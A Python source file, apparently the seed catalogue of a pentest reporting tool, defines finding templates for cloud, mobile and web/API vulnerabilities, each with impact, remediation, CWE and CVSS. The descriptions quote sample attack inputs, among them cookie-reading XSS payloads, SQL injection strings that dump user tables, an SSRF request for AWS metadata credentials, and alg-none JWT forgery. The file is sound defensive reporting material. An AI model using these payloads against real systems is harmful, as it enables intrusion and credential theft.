            references="https://docs.aws.amazon.com/AmazonS3/latest/userguide/MultiFactorAuthenticationDelete.html",
            cwe="CWE-693",
            cvss_score=5.3),

        _f("aws_cloud_vapt", "Managed Policy Uses NotActions", "Medium",
            description="A managed IAM policy defines its allow rules using `NotAction` instead of `Action`. `NotAction` grants every API EXCEPT the listed ones, which is rarely what the author intended.",
            impact="Future AWS services launched after the policy was written are silently granted access. Privilege escalation can result from a service that wasn't on the author's radar (e.g. when AWS adds a new IAM-modifying API).",
            remediation="- Rewrite the policy with explicit `Action` allow-lists.\n- If a deny-list is genuinely required, place it in an SCP and pair it with a deny statement, not an `Allow` with `NotAction`.\n- Run IAM Access Analyzer on the policy to surface unintended access.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_notaction.html",
            cwe="CWE-732",
            cvss_score=5.4),

        _f("aws_cloud_vapt", "Cross-Account AssumeRole Policy Lacks External ID and MFA", "High",
            description="A role's trust policy permits cross-account assumption from a partner / vendor account without either an `sts:ExternalId` condition or an `aws:MultiFactorAuthPresent` condition.",
            impact="Confused-deputy attacks: a malicious third-party that knows the role ARN can quietly assume the role from their own account. Without External ID the only thing standing between them and the resources is whether they can guess / discover the ARN.",
            remediation="- Add an `sts:ExternalId` condition with a per-partner secret value to every cross-account trust.\n- Require `aws:MultiFactorAuthPresent` (boolean) for human cross-account assumption.\n- For machine-to-machine trust, consider IAM Roles Anywhere or workload identity federation in place of long-lived cross-account roles.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-user_externalid.html\nhttps://cwe.mitre.org/data/definitions/940.html",
            cwe="CWE-940",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("aws_cloud_vapt", "KMS Customer Master Keys (CMKs) With Rotation Disabled", "Low",
            description="One or more customer-managed KMS keys have automatic key rotation disabled (`KeyRotationEnabled: false`). The same key material is used to encrypt data indefinitely.",
            impact="Long-term use of unrotated key material increases the window in which a compromised key version exposes plaintext. Some compliance regimes (CIS AWS 1.4 ID 3.8) treat non-rotating CMKs as a finding regardless of breach status.",
            remediation="- Enable automatic key rotation on every customer-managed CMK (`aws kms enable-key-rotation --key-id <id>`).\n- For AWS-managed keys, rotation is automatic — no action required.\n- Schedule manual rotation for keys whose `KeyUsage: SIGN_VERIFY` blocks auto-rotation.",
            references="https://docs.aws.amazon.com/kms/latest/developerguide/rotate-keys.html",
            cwe="CWE-324",
            cvss_score=3.7),

        _f("aws_cloud_vapt", "EC2 Instance Backups (AMIs / Snapshots) Disabled", "Medium",
            description="One or more EC2 instances hold business-critical data on attached EBS volumes but are not covered by an AWS Backup plan, an automatic snapshot lifecycle policy, or any other recurring backup mechanism.",
            impact="Loss of the EBS volume (accidental termination, region outage, ransomware, or storage failure) results in unrecoverable data loss. Recovery-time objective and recovery-point objective are effectively unbounded.",
            remediation="- Define an AWS Backup plan covering every business-critical instance with a daily snapshot + retention window.\n- Replicate critical snapshots to a secondary region.\n- Test restores quarterly; an untested backup is a guess.",
            references="https://docs.aws.amazon.com/aws-backup/latest/devguide/whatisbackup.html",
            cwe="CWE-1188",
            cvss_score=4.4),
    ])

    # ============================================================
    # 2026-05 catalogue expansion — common findings the team kept
    # asking for across web / API / mobile / infra / thick client /
    # cloud / SCR. Every entry has a CWE and a 4.0 vector so the
    # exported tracker's CVSS + CWE columns are populated from day one.
    # ============================================================

    # ---- Mobile -----------------------------------------------------
    F.extend([
        _f("mobile_pt", "SSL/TLS Certificate Pinning Not Implemented", "Medium",
            description="The mobile application establishes TLS connections to its backend without pinning the server's certificate or public key. Burp Suite's CA cert was installed on the device, the app was relaunched, and every API request was intercepted in cleartext — including the login flow, session tokens, and PII in `GET /api/profile/me`.\n\nThe absence of pinning means the app trusts whatever certificate chain rolls up to the device's system trust store, including any user-installed root CA.",
            impact="A motivated attacker on the same network — corporate proxy, captive Wi-Fi, custom-rooted device, MDM-pushed CA — can intercept and modify every request the app makes. Session tokens, OTPs, and financial transactions are observable; downstream API endpoints can be replayed or tampered with.",
            remediation="- Implement certificate pinning (full-cert or SPKI hash) for every production backend host.\n- iOS: use `NSAppTransportSecurity` with `NSPinnedDomains`, or pin via URLSession's `urlSession(_:didReceive:completionHandler:)` delegate.\n- Android: use `network_security_config.xml` `<pin-set>` with at least two SHA-256 SPKI pins (current + backup) and a `pin-expiration` date.\n- Plan a key-rotation procedure that ships a new app version with both old AND new pins before the cert rolls — otherwise pinning causes outages.",
            references="https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning\nhttps://developer.android.com/training/articles/security-config\nhttps://mas.owasp.org/MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0034/",
            cwe="CWE-295", owasp="M3: Insecure Communication",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Root / Jailbreak Detection Not Implemented", "Low",
            description="The application launches and operates normally on a rooted Android device (verified via Magisk) and on a jailbroken iOS device (verified via checkra1n). No runtime check inspects for the presence of `su`, `Cydia.app`, modified system partitions, or other jailbreak/root indicators.",
            impact="On a rooted/jailbroken device, an attacker can extract decrypted application memory, hook Java/Objective-C methods at runtime with Frida/Xposed, dump local storage, and bypass biometric prompts. For apps handling regulated data (banking, healthcare, government), this is a compliance requirement (PSD2 SCA, OWASP MASVS-RESILIENCE-1).",
            remediation="- Add runtime root/jailbreak checks at app launch and at every privileged action.\n- Use a library such as RootBeer (Android) or IOSSecuritySuite (iOS) for layered checks.\n- Don't rely on a single check — combine file presence, signature mismatches, and behavioural tests.\n- Decide on the response: warn, restrict features, or refuse to run. The right choice is engagement-specific.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0046/\nhttps://github.com/scottyab/rootbeer",
            cwe="CWE-693", owasp="M9: Reverse Engineering",
            cvss_score=3.9,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Hardcoded Credentials / API Keys in APK / IPA", "High",
            description="Reverse-engineering the released APK with `apktool d` and grepping the decompiled smali / strings.xml surfaces production credentials embedded in the binary:\n- `FIREBASE_API_KEY=AIzaSy…`\n- `AWS_ACCESS_KEY_ID=AKIA…` / `AWS_SECRET_ACCESS_KEY=…`\n- A bearer token in `BuildConfig.API_TOKEN` used as a fallback when no user is signed in.\n\nThe iOS IPA exposes the same values in the `Info.plist` and embedded `.strings` files.",
            impact="Anyone who downloads the app from the Play Store / App Store can extract these secrets in minutes. AWS keys with broad permissions enable full account compromise; Firebase keys can be abused to read/write the entire backend; bearer tokens grant API access without authenticating as a real user.",
            remediation="- Move every secret to a server-side endpoint the app authenticates against — the app never ships with the secret in its binary.\n- For values that MUST live in the app (e.g. Firebase project id), treat them as public — they're not secrets.\n- Rotate any key found in this finding immediately. Assume it's already extracted.\n- Use the Play Console / App Store Connect's `String resources` redaction features and a CI grep gate that fails the build if known secret patterns are detected.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0023/\nhttps://cwe.mitre.org/data/definitions/798.html",
            cwe="CWE-798", owasp="M10: Extraneous Functionality",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"),

        _f("mobile_pt", "Sensitive Data Written to External / Shared Storage", "Medium",
            description="The application writes session tokens / cached PII to a path that's readable by other apps on the device:\n- Android: `/sdcard/Android/data/<pkg>/cache/` (world-readable on pre-Q devices), or shared `Downloads/` directory.\n- iOS: writes to `Documents/` with no `NSFileProtection` attribute set — the file is decrypted as long as the device has been unlocked once after boot.",
            impact="Any malicious app the user installs (or any user with USB debugging access) can read the stored data without root. Tokens can be lifted and replayed against the backend; PII can be exfiltrated.",
            remediation="- Android: write to internal storage (`Context.getFilesDir()` or EncryptedSharedPreferences) rather than external. Set `android:requestLegacyExternalStorage=\"false\"` and target API 29+.\n- iOS: pass `FileProtectionType.completeUnlessOpen` (or `complete`) when writing. Prefer the Keychain for tokens.\n- Encrypt at rest with a key sourced from the platform Keystore (Android) / Secure Enclave (iOS) — never a hardcoded key.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0001/",
            cwe="CWE-312", owasp="M2: Insecure Data Storage",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Insecure Use of WebView (Mixed Content / JavaScript Bridge)", "Medium",
            description="The app embeds a `WebView` (Android) / `WKWebView` (iOS) with `setJavaScriptEnabled(true)` and an `addJavascriptInterface()` that exposes a `NativeBridge` object containing the methods `openCamera`, `readContact`, and `executeShell`. The WebView loads pages over HTTP and accepts mixed content (`setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`).\n\nAn XSS in any loaded page — or a MitM attacker who can inject script into a cleartext response — calls `NativeBridge.executeShell('id')` and gets back the result.",
            impact="A single content-injection point (XSS, MitM, malicious advertisement, vulnerable third-party page) escalates from \"script in a sandbox\" to native-app RCE because of the exposed bridge. Camera access, contacts, files, and shell execution are all reachable from the compromised page.",
            remediation="- Remove `addJavascriptInterface` if not strictly needed.\n- If it's needed, whitelist the methods it exposes — never call into raw OS APIs from it.\n- Disable mixed content (`setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW)`); load only HTTPS.\n- Pin the WebView's target hosts; refuse to navigate to others (`shouldOverrideUrlLoading`).\n- Target Android API 17+ and apply `@JavascriptInterface` so older Android versions can't call hidden methods via reflection.",
            references="https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)\nhttps://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0036/",
            cwe="CWE-749", owasp="M7: Client Code Quality",
            cvss_score=7.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Insufficient Anti-Tampering / No Integrity Check", "Low",
            description="The app's APK signature / IPA signature is not verified at runtime. Repackaging the app with `apktool b`, re-signing with a self-signed key, and installing on a stock device produces a fully functional clone — backend APIs answer to the tampered client without resistance.",
            impact="An attacker can ship a re-skinned malicious clone of the app to victims (phishing campaigns), or modify the genuine app to disable security checks, exfiltrate inputs, or bypass licensing.",
            remediation="- Verify the signing certificate fingerprint at launch and at every privileged action. Refuse to run if it doesn't match the expected production value.\n- Use Play Integrity / SafetyNet (Android) and DeviceCheck / App Attest (iOS) to validate the client at the backend before issuing session tokens.\n- Combine with code obfuscation (R8/ProGuard, Swift Obfuscator) so an attacker can't trivially patch the signature check out.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0047/\nhttps://developer.android.com/google/play/integrity",
            cwe="CWE-693",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:L/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- Web / API additions ---------------------------------------
    F.extend([
        _f("web_vapt", "Cross-Site Scripting (Stored)", "High",
            description="User-supplied input is stored on the server and rendered into another user's HTML response without contextual output encoding. Example: the `comment` field on `POST /api/posts/{id}/comments` accepts the payload `<img src=x onerror=alert(document.cookie)>` and renders it verbatim into the comment thread for every viewer.",
            impact="An attacker can hijack session cookies, force actions in the victim's browser, deface the page, and pivot to internal applications via CSRF-on-internal-only-endpoints. Stored XSS hits every visitor — including admins, multiplying the blast radius.",
            remediation="- Apply context-appropriate output encoding at the render sink (HTML body, attribute, JavaScript, URL, CSS — each has different rules).\n- Use a templating engine that escapes by default (Jinja2, React JSX, Angular interpolation).\n- Set a strict `Content-Security-Policy` (`default-src 'self'; script-src 'self'`) so even a successful injection can't execute attacker-controlled JavaScript.\n- Sanitize on input with an HTML allow-list library (DOMPurify) if rich-text input is actually required.",
            references="https://owasp.org/www-community/attacks/xss/\nhttps://cwe.mitre.org/data/definitions/79.html",
            cwe="CWE-79", owasp="A03:2021",
            cvss_score=8.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Cross-Site Scripting (Reflected)", "Medium",
            description="A request parameter is reflected unescaped into the immediate response. `GET /search?q=<script>alert(1)</script>` returns a page containing the raw payload inside `<p>Results for: …</p>`, executing the script in the victim's browser context.",
            impact="A malicious link emailed / shared / pasted into a chat triggers script execution in the victim's session when clicked. Same exploitation primitives as stored XSS, just requires social engineering to trigger.",
            remediation="- Encode every reflected value contextually (HTML entity, attribute, JS string, URL component).\n- Where the value MUST appear inside a script context, JSON-encode it.\n- Set `Content-Security-Policy: default-src 'self'; script-src 'self'`.\n- For search-style endpoints, set `X-Content-Type-Options: nosniff` and ensure responses use `Content-Type: text/html; charset=utf-8`.",
            references="https://owasp.org/www-community/attacks/xss/",
            cwe="CWE-79", owasp="A03:2021",
            cvss_score=6.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Cross-Site Scripting (DOM-Based)", "Medium",
            description="Client-side JavaScript reads a value from `location.hash` / `document.URL` / `window.name` and writes it into the DOM via a sink that does not encode HTML. `https://app/#<img src=x onerror=alert(1)>` triggers script execution without the server ever seeing the payload.",
            impact="DOM XSS bypasses every server-side WAF and request-logging mechanism because the payload lives in the fragment that the browser doesn't send to the origin. Detection in production logs is hard.",
            remediation="- Read user-controlled values via DOM APIs that escape automatically (`textContent`, `innerText`, `setAttribute`) rather than `innerHTML` / `document.write` / `eval`.\n- Use a trusted-types CSP (`require-trusted-types-for 'script'`) to block dangerous sinks at the browser level.\n- Audit every `innerHTML`/`outerHTML`/`document.write` for tainted-data flow.",
            references="https://owasp.org/www-community/attacks/DOM_Based_XSS",
            cwe="CWE-79", owasp="A03:2021",
            cvss_score=5.8,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "SQL Injection (Error-Based / Time-Based)", "Critical",
            description="The `id` parameter on `GET /api/orders?id=42` is concatenated into a SQL query without parameterisation. The payload `42' OR SLEEP(5)-- ` causes the response to delay by 5 seconds; `42 UNION SELECT username,password FROM users-- ` returns the user table.",
            impact="An attacker can read or modify any data the application's DB user can reach — typically the entire schema. Many engagements escalate from SQLi to OS RCE via `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL), or `pg_read_server_files` (Postgres).",
            remediation="- Replace string concatenation with parameterised queries / prepared statements at every query site. The fix is per-query, not per-input — input sanitisation alone is insufficient.\n- Use an ORM that parameterises by default (SQLAlchemy, Hibernate, Entity Framework, Django ORM).\n- Apply least-privilege to the DB user (no DDL, no file IO, no `SUPER`/`xp_cmdshell`).\n- Add a WAF rule for known SQLi signatures as defence in depth — but the parameterised fix is the only real fix.",
            references="https://owasp.org/www-community/attacks/SQL_Injection\nhttps://cwe.mitre.org/data/definitions/89.html",
            cwe="CWE-89", owasp="A03:2021",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Server-Side Request Forgery (SSRF)", "High",
            description="The application provides a \"fetch a remote URL\" feature (image proxy, webhook tester, URL preview, PDF generator). Submitting `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns AWS instance-role credentials. Submitting `http://internal-redis.svc:6379/INFO` returns the internal Redis banner.",
            impact="The application becomes a proxy into the internal network — cloud metadata services, internal admin panels, databases, and microservices that aren't exposed to the Internet are reachable from the attacker's browser. AWS instance credentials grant access to whatever IAM role the workload assumes.",
            remediation="- Validate the target URL: resolve the hostname, reject IPs in private ranges (RFC1918, link-local 169.254.0.0/16, localhost, cloud metadata IPs).\n- Apply the validation AFTER DNS resolution AND immediately before the request (TOCTOU: a DNS server can return a public IP on first lookup and a private one on the second).\n- Use an outbound HTTP proxy that enforces the allow-list.\n- On AWS, require IMDSv2 (session-token-bound) so an SSRF can't read instance role creds.\n- Set a low socket timeout so attackers can't use the SSRF as a port scanner via response-time differences.",
            references="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\nhttps://cwe.mitre.org/data/definitions/918.html",
            cwe="CWE-918", owasp="A10:2021",
            cvss_score=8.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L/SC:H/SI:N/SA:N",
            extra_templates=["api_vapt", "aws_cloud_vapt", "azure_cloud_vapt"]),

        _f("web_vapt", "Insecure Direct Object Reference (IDOR)", "High",
            description="The application exposes user-controlled object identifiers as URL / body parameters and authorises actions based on session identity but not on resource ownership. `GET /api/invoices/1042` returns invoice #1042 regardless of whether the caller's user is the invoice's owner.",
            impact="Any authenticated user can enumerate and read / modify / delete every other user's data by sequentially incrementing the identifier. For applications holding financial, medical, or HR data the regulatory consequences are severe.",
            remediation="- Always re-derive resource ownership from the authenticated user at the request handler, never trust the client-supplied id alone (`SELECT … WHERE id=? AND owner_id=?`).\n- Prefer UUIDs over auto-incrementing integers (mitigates enumeration but is NOT a security control by itself).\n- Add per-resource access-control middleware that enforces the rule centrally.\n- Add automated tests that try every endpoint with another user's resource ids.",
            references="https://owasp.org/www-community/Top_10/A01_2021-Broken_Access_Control/",
            cwe="CWE-639", owasp="A01:2021",
            cvss_score=8.0,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Broken Object Property Level Authorization (Mass Assignment)", "High",
            description="`PATCH /api/users/me` accepts an arbitrary JSON body and forwards every key into the ORM's `.update()` call: `{ \"role\": \"admin\", \"is_email_verified\": true }` silently elevates the calling user to administrator.",
            impact="A standard user can self-elevate to admin or modify any persisted property the model exposes — including security-relevant fields like `password_hash` (when accepted from the client), MFA reset tokens, or trust flags.",
            remediation="- Define an explicit allow-list of writable fields per endpoint. Reject (or silently drop) anything outside it.\n- Use DTOs / Pydantic models / serializers with `exclude_unset=True` AND a fixed field set — never `**request.json`.\n- Add a unit test that verifies sensitive fields cannot be set via the public update endpoint.",
            references="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
            cwe="CWE-915", owasp="A04:2021",
            cvss_score=8.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Open Redirect", "Low",
            description="A `redirect_to` / `next` / `returnUrl` parameter on the login flow is honoured without validation. `https://app.example.com/login?next=https://evil.example.com/phish` redirects the user to the attacker's domain after a successful authentication.",
            impact="Open redirects are themselves low-severity but they're an enabler — phishing campaigns exploit them to make malicious URLs look like they originate from the legitimate domain, and OAuth flows that trust the `redirect_uri` parameter can be hijacked.",
            remediation="- Validate the redirect target against an allow-list of internal paths (e.g. only allow values starting with `/` AND containing no `//` or `\\\\`).\n- Where external redirects are genuinely needed, render an interstitial \"You are leaving example.com → …\" page that requires a click.\n- Never reflect the value into a `Location:` header without validating first.",
            references="https://cwe.mitre.org/data/definitions/601.html",
            cwe="CWE-601", owasp="A01:2021",
            cvss_score=4.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Missing or Misconfigured Security Headers", "Low",
            description="The application's HTTPS responses are missing one or more of the following: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options` / `frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`.\n\nExample: `curl -I https://app | grep -i strict-transport-security` returns nothing.",
            impact="Each missing header weakens a specific defence-in-depth layer — clickjacking via missing frame-ancestors, MIME sniffing via missing nosniff, downgrade attacks via missing HSTS. Together they form the baseline browser-side security posture; missing them all is a noticeable gap.",
            remediation="- Configure the application's reverse proxy (nginx, traefik, ELB) or the framework's middleware to emit:\n  - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`\n  - `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'`\n  - `X-Content-Type-Options: nosniff`\n  - `Referrer-Policy: strict-origin-when-cross-origin`\n  - `Permissions-Policy: camera=(), microphone=(), geolocation=()` (tighten to what you actually use)\n- Validate the result with the Mozilla Observatory and `securityheaders.com`.",
            references="https://owasp.org/www-project-secure-headers/\nhttps://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
            cwe="CWE-693", owasp="A05:2021",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "infra_vapt"]),

        _f("web_vapt", "Cross-Site Request Forgery (CSRF)", "Medium",
            description="A state-changing endpoint (`POST /api/account/change-email`) accepts cookie-only authentication and does not require a CSRF token, custom header, or SameSite-strict cookie. A crafted HTML form hosted at `evil.example.com` can submit a request that the victim's browser sends with their session cookie attached, changing the email on their account without consent.",
            impact="An attacker who tricks an authenticated user into visiting a malicious page can perform any sensitive action the victim's session is authorised for — change email, password reset, fund transfer, profile edit.",
            remediation="- Set session cookies to `SameSite=Lax` (default) or `SameSite=Strict` (highest protection).\n- For every state-changing endpoint require either:\n  - A double-submit CSRF token (cookie + form/header value must match), OR\n  - A custom request header that browsers won't include cross-origin (`X-Requested-With: XMLHttpRequest`).\n- Validate `Origin` / `Referer` headers as a secondary check.\n- API-style endpoints called only by JavaScript should require `Content-Type: application/json` AND a bearer token (cookies are the CSRF-prone surface).",
            references="https://owasp.org/www-community/attacks/csrf",
            cwe="CWE-352", owasp="A01:2021",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:L/SA:N"),

        _f("web_vapt", "Insecure Deserialization", "Critical",
            description="The application accepts a serialised object as input — a Java `ObjectInputStream` blob, a Python `pickle` payload, a .NET `BinaryFormatter` stream, or a YAML document parsed with `yaml.load()` (not `safe_load`). The runtime deserialiser instantiates classes whose constructors execute arbitrary code, achieving RCE on the server.",
            impact="Remote Code Execution as the application's runtime user. Recent high-profile CVEs (Log4Shell, ysoserial gadget chains, .NET BinaryFormatter) demonstrate that a single deserialisation sink is typically a full compromise of the affected service.",
            remediation="- Replace native binary serialisers with safe text formats (JSON for data; signed JWT for tamper-resistant payloads).\n- Where binary serialisation is non-negotiable, use a typed deserialiser that requires explicit class allow-listing.\n- For YAML, always use `yaml.safe_load`.\n- Sign serialised payloads with HMAC before transmission and verify on receipt.",
            references="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\nhttps://cwe.mitre.org/data/definitions/502.html",
            cwe="CWE-502", owasp="A08:2021",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Use of Components With Known Vulnerabilities", "High",
            description="Dependency scanning of the production build surfaces packages with published CVEs:\n- `log4j 2.14.0` (CVE-2021-44228 — Log4Shell, RCE)\n- `spring-core 5.3.17` (CVE-2022-22965 — Spring4Shell, RCE)\n- `lodash 4.17.15` (CVE-2020-8203 — prototype pollution)\n- An OpenSSL build affected by CVE-2022-3786 / 3602\n\nThe affected libraries are reachable on the request path or in the configured class-loader.",
            impact="Severity tracks the worst CVE present. For RCE-class vulnerabilities (Log4Shell, Spring4Shell, Struts S2-045) a single unpatched server is typically a full compromise. For non-RCE issues (prototype pollution, ReDoS) the impact ranges from DoS to logic bypasses depending on how the library is used.",
            remediation="- Upgrade every flagged package to a patched version. Re-run the scanner to confirm.\n- Adopt a continuous dependency-scanning gate in CI (Dependabot, Snyk, OWASP Dependency-Check, Trivy).\n- Document a Service-Level Objective for patch turnaround (e.g. Critical: 7 days, High: 30 days).\n- Pin direct dependencies but allow patch-level upgrades; review the diff for transitive risk.",
            references="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
            cwe="CWE-1104", owasp="A06:2021",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "infra_vapt", "source_code_review"]),

        _f("web_vapt", "Unrestricted File Upload", "High",
            description="`POST /api/avatar` accepts any `multipart/form-data` upload with `Content-Type: image/png` and stores it at `/var/www/uploads/<random>.<original-ext>` served from the same host. Uploading a `.php` file with a fake `Content-Type` header succeeds; navigating to `/uploads/shell.php` executes the file.",
            impact="Web shell upload leads to immediate RCE. Even when upload paths don't execute, attackers use them for phishing (host malware payloads on the trusted domain), XSS (upload SVG with embedded `<script>`), or CSV-injection-via-uploaded-file.",
            remediation="- Validate uploads at multiple layers: magic-byte sniffing, content-type allowlist, file-extension allowlist, file-size limit.\n- Store uploads outside the document root; serve via an authenticated handler that sets `Content-Disposition: attachment` for non-image types.\n- Re-encode images server-side (ImageMagick/Pillow) to strip embedded payloads.\n- Disable script execution on the upload directory at the web-server level (`location /uploads { … fastcgi off; … }`).",
            references="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
            cwe="CWE-434",
            cvss_score=8.9,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Improper JWT Validation / Algorithm Confusion", "High",
            description="The application accepts a JWT in `Authorization: Bearer …`. Sending a token with the header altered to `{\"alg\":\"none\"}` and the signature stripped is accepted as valid. Sending an HS256-signed token whose key is the public-key PEM of the RS256 keypair is also accepted (the `RS256→HS256` confusion).",
            impact="An attacker who can craft a JWT can impersonate any user, including administrators, without ever stealing a real session. Coupled with mass-assignment or IDOR this is full account takeover.",
            remediation="- Pin the expected algorithm at validation time (`jwt.decode(t, key, algorithms=['RS256'])`).\n- Never trust the `alg` claim in the token header.\n- For asymmetric algorithms, the public key is the verifying key — it MUST NOT be used as an HMAC secret.\n- Use a JWT library that defaults to safe behaviour (most modern ones now do).",
            references="https://datatracker.ietf.org/doc/html/rfc7519\nhttps://cwe.mitre.org/data/definitions/347.html",
            cwe="CWE-347", owasp="A02:2021",
            cvss_score=8.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Session Fixation", "Medium",
            description="After authentication, the application reuses the pre-login session identifier rather than rotating it. An attacker who can plant a known session id in the victim's browser (via a malicious link or a non-HttpOnly cookie) authenticates as the victim by re-using the same id afterwards.",
            impact="Account takeover when combined with a way to set the session cookie before login — common in XSS-adjacent or shared-host scenarios.",
            remediation="- Rotate the session identifier on every privilege boundary (login, MFA upgrade, password change).\n- Invalidate the pre-login session at the same moment the new one is issued.\n- Combine with `Secure`, `HttpOnly`, `SameSite=Lax` on the session cookie.",
            references="https://owasp.org/www-community/attacks/Session_fixation",
            cwe="CWE-384",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Weak / Missing CAPTCHA on Authentication Endpoints", "Low",
            description="The login, forgot-password, and registration endpoints have no rate-limit-aware CAPTCHA and no behavioural anti-bot. Burp Intruder with a 10k-username + 100-password dictionary completes a credential-stuffing run with no challenge.",
            impact="Credential stuffing succeeds at scale, leading to compromised user accounts whenever a victim has re-used a password from an unrelated breach. Account-enumeration attacks succeed similarly.",
            remediation="- Add a CAPTCHA / proof-of-work / behavioural anti-bot challenge after N failed attempts per IP, per username, or per session.\n- Rate-limit at the edge (5 attempts per minute per IP is a reasonable floor).\n- Implement device fingerprinting + risk-based authentication for sensitive endpoints.",
            references="https://owasp.org/www-community/attacks/Credential_stuffing",
            cwe="CWE-307", owasp="A07:2021",
            cvss_score=3.8,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Improper Session Expiry / No Idle Timeout", "Low",
            description="A captured session token is still accepted by the API 30 days after the user's last activity, and 90 days after login. The application sets no `expires_in` claim on its JWT, no idle-timeout on its cookie session, and no server-side revocation.",
            impact="A stolen token (lost laptop, XSS exfiltration, browser-extension malware) stays valid forever. A user who left a session signed in on a shared kiosk remains logged in indefinitely.",
